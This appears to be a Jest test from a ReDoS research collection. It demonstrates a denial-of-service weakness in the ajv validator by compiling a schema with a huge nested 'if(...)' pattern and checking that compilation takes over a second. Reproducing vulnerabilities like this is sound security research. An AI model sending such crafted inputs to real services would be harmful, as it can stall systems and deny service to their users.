//https://github.com/sola-da/ReDoS-vulnerabilities/blob/master/test-ajv.js
test("ReDos in ajv", () => {
    const genstr = require("./utils").genstr;
    const measureTime = require("./utils").measureTime;
    var Ajv = require('ajv');
    var ajv = new Ajv;
      
    const color = 'rgb(' +  genstr(14,"0000,") + '000';
  
    let t = measureTime(function () {
        var validate = ajv.compile({
            "type": "object",
            "properties": {
                "foo": {
                    "type": 'string',
                    "oneOf": [
                        {"pattern": genstr(10000, "if(") + "x" + genstr(10000, ")")}
                    ]
                }
            }
        });
    });
  
    let time = t[0] + t[1] / 1000000000;
  
    expect(time).toBeGreaterThan(1);
  });